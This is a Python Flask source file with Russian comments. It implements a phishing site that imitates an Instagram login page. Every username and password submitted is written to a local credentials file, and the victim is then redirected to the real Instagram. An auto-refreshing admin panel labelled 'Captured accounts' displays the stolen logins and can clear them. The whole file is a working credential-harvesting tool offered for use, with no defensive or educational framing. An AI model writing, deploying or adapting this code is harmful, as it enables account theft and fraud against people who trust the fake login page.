import os
from flask import Flask, request, redirect, render_template_string
import datetime

app = Flask(__name__)

# ====================== АДМИНКА ======================
ADMIN_PASSWORD = "твой_сильный_пароль_здесь"   # ←←← ОБЯЗАТЕЛЬНО ИЗМЕНИ!

# ====================== HTML ФРОНТЕНД ======================
INSTAGRAM_PAGE_HTML = """твой полный HTML код сюда (оставь как был)"""

# ====================== АДМИН ПАНЕЛЬ ======================
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0f0f0f; color: #0f0; padding: 20px; }
        h1 { color: #0f0; }
        pre { background: #1a1a1a; padding: 15px; border-radius: 8px; max-height: 80vh; overflow-y: auto; white-space: pre-wrap; }
        .btn { padding: 12px 25px; background: #c00; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        .btn:hover { background: #f00; }
    </style>
    <script>
        setInterval(() => location.reload(), 5000); // автообновление каждые 5 секунд
    </script>
</head>
<body>
    <h1>🔴 Админ Панель — Захваченные аккаунты</h1>
    <p><strong>Обновлено:</strong> {{ time }}</p>
    <pre>{{ logs }}</pre>
    <form method="POST" action="/admin/clear">
        <button type="submit" class="btn">Очистить все логи</button>
    </form>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username and password:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] Username: {username} | Password: {password}\n"
            
            try:
                with open('credentials.txt', 'a', encoding='utf-8') as f:
                    f.write(log_entry)
                print(f"✅ ЗАХВАЧЕНО → {username}")
            except Exception as e:
                print(f"❌ Ошибка записи: {e}")
        
        return redirect("https://www.instagram.com", code=302)
    
    return render_template_string(INSTAGRAM_PAGE_HTML)


@app.route('/admin', methods=['GET'])
def admin():
    try:
        with open('credentials.txt', 'r', encoding='utf-8') as f:
            logs = f.read() or "Пока нет данных..."
    except FileNotFoundError:
        logs = "Файл с логами ещё не создан. Отправь первый логин."

    return render_template_string(ADMIN_HTML, 
                                logs=logs, 
                                time=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))


@app.route('/admin/clear', methods=['POST'])
def clear_logs():
    try:
        open('credentials.txt', 'w', encoding='utf-8').close()
        print("🗑 Логи очищены")
    except:
        pass
    return redirect('/admin')


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
